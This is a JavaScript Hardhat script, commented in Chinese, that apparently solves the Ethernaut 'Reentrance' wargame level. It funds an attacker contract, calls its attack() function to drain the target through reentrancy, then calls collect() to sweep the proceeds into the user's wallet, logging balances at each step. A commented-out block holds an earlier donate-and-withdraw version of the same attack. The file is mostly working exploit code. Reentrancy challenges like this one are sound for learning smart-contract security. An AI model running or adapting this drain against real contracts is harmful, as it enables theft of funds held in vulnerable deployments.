import hre from "hardhat";
const { ethers } = hre;

// 請將以下地址替換成部屬後的實例合約地址
const reentrance_address = "0x85b96E2122c01C1C3ba0BfB9838cc3523D4176d1";
const reentranceAttacker_address = "0x7080733c7BD9E2ad1c2AC64339DBC9503a1Ae82d";
console.log("目標 Reentrance 實例合約地址:", reentrance_address);
console.log("目標 ReentranceAttacker 實例合約地址:", reentranceAttacker_address);

const [signer] = await ethers.getSigners();
console.log("我的帳戶地址: ", signer.address);

// 取得合約實例
const reentrance = await ethers.getContractAt("Reentrance", reentrance_address);
const reentranceAttacker = await ethers.getContractAt("ReentranceAttacker", reentranceAttacker_address);

async function main() {
    console.log(" ");
    console.log("我錢包地址的總餘額: ", await ethers.provider.getBalance(signer.address));
    console.log("我錢包地址目前在 Reentrance 的餘額: ", await reentrance.balanceOf(signer.address));
    console.log("ReentranceAttacker 目前在 Reentrance 的餘額: ", await reentrance.balanceOf(reentranceAttacker_address));
    const reentrance_balance = await ethers.provider.getBalance(reentrance_address);
    console.log("Reentrance 的總餘額: ", reentrance_balance);
    const reentranceAttacker_balance = await ethers.provider.getBalance(reentranceAttacker_address);
    console.log("ReentranceAttacker 的總餘額: ", reentranceAttacker_balance);
    /*
    // ===========================
    // Step 1: Donate to the target via the attacker contract.
    const value = ethers.parseEther("0.0012");
    console.log("Sending transaction to donate()...");
    const tx = await reentranceAttacker.donate(signer.address, {
        value: value
    });
    // 等待交易確認
    console.log("交易發送中，交易哈希:", tx.hash);
    const receipt = await tx.wait();
    console.log("交易確認，區塊號:", receipt.blockNumber);

    // Step 2: Call withdraw to launch the reentrancy attack.
    console.log("Initiating reentrancy attack via withdraw...");
    const withdrawTx = await reentranceAttacker.withdraw(ethers.parseEther("0.0012"));
    const receipt1 = await withdrawTx.wait();
    console.log("交易確認，區塊號:", receipt.blockNumber);
    console.log("Reentrancy attack completed.");
    // ===========================
    */

    console.log(" ");
    console.log("Sending 0.001 ETH transaction to donate()...");
    const tx0 = await reentrance.donate(reentranceAttacker_address, {
        value: ethers.parseEther("0.001")
    });

    // 等待交易確認
    console.log("交易發送中，交易哈希:", await tx0.hash);
    const receipt_tx0 = await tx0.wait();
    console.log("交易確認，區塊號:", receipt_tx0.blockNumber);

    console.log("我錢包地址的總餘額: ", await ethers.provider.getBalance(signer.address));
    console.log("我錢包地址目前在 Reentrance 的餘額: ", await reentrance.balanceOf(signer.address));
    console.log("ReentranceAttacker 目前在 Reentrance 的餘額: ", await reentrance.balanceOf(reentranceAttacker_address));
    console.log("Reentrance 的總餘額: ", await ethers.provider.getBalance(reentrance_address));
    console.log("ReentranceAttacker 的總餘額: ", await ethers.provider.getBalance(reentranceAttacker_address));


    console.log(" ");
    console.log("attacker begin attack...");
    // const tx1 = await reentranceAttacker.withdraw(ethers.parseEther("0.001"));
    const tx1 = await reentranceAttacker.attack({
        value: ethers.parseEther("0.001")
    });
    // 等待交易確認
    console.log("交易發送中，交易哈希:", await tx1.hash);
    const receipt_tx1 = await tx1.wait();
    console.log("交易確認，區塊號:", receipt_tx1.blockNumber);

    console.log("我錢包地址的總餘額: ", await ethers.provider.getBalance(signer.address));
    console.log("我錢包地址目前在 Reentrance 的餘額: ", await reentrance.balanceOf(signer.address));
    console.log("ReentranceAttacker 目前在 Reentrance 的餘額: ", await reentrance.balanceOf(reentranceAttacker_address));
    console.log("Reentrance 的總餘額: ", await ethers.provider.getBalance(reentrance_address));
    console.log("ReentranceAttacker 的總餘額: ", await ethers.provider.getBalance(reentranceAttacker_address));

    console.log(" ");
    console.log("collect... ");
    await reentranceAttacker.collect();
    
    console.log("我錢包地址的總餘額: ", await ethers.provider.getBalance(signer.address));
    console.log("我錢包地址目前在 Reentrance 的餘額: ", await reentrance.balanceOf(signer.address));
    console.log("ReentranceAttacker 目前在 Reentrance 的餘額: ", await reentrance.balanceOf(reentranceAttacker_address));
    console.log("Reentrance 的總餘額: ", await ethers.provider.getBalance(reentrance_address));
    console.log("ReentranceAttacker 的總餘額: ", await ethers.provider.getBalance(reentranceAttacker_address));
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });